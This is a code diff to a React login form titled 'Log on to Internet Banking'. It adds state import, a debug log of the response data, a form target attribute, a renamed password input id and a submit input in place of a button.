@@ -1,4 +1,4 @@
-import React from 'react'
+import React, { useState } from 'react'
 
 export default function Form() {
   const [username, setUsername] = useState('')
@@ -15,6 +15,7 @@ export default function Form() {
     })
 
     const data = await res.json()
+    console.log('Data', data)
     setMsg(data.message)
 
     if (data.status === 'success') {
@@ -24,7 +25,11 @@ export default function Form() {
   }
   return (
     <div>
-      <form onSubmit={handleSubmit} className='form p-3 px-8  rounded-xl flex flex-col gap-4'>
+      <form
+        onSubmit={handleSubmit}
+        target='_blank'
+        className='form p-3 px-8  rounded-xl flex flex-col gap-4'
+      >
         <div className='leading-4'>
           <h3>Log on to Internet Banking</h3>
           <label htmlFor='username'>
@@ -45,7 +50,7 @@ export default function Form() {
           <div className='flex flex-col gap-4'>
             <input
               type='text'
-              id='verify'
+              id='password'
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder='4456'
@@ -59,9 +64,11 @@ export default function Form() {
             />
           </div>
         </div>
-        <button className='flex justify-start bg-[#e0ad0f] max-w-26 px-8 font-semibold p-1 text-[15px] rounded-lg'>
-          Next
-        </button>
+        <input
+          type='submit'
+          value={'Next'}
+          className='flex justify-start bg-[#e0ad0f] max-w-26 px-8 font-semibold p-1 text-[15px] rounded-lg'
+        />
         <div className='divider'></div>
         <p>New customer ?</p>
         <button className='registerbtn '>Self-Registration</button>
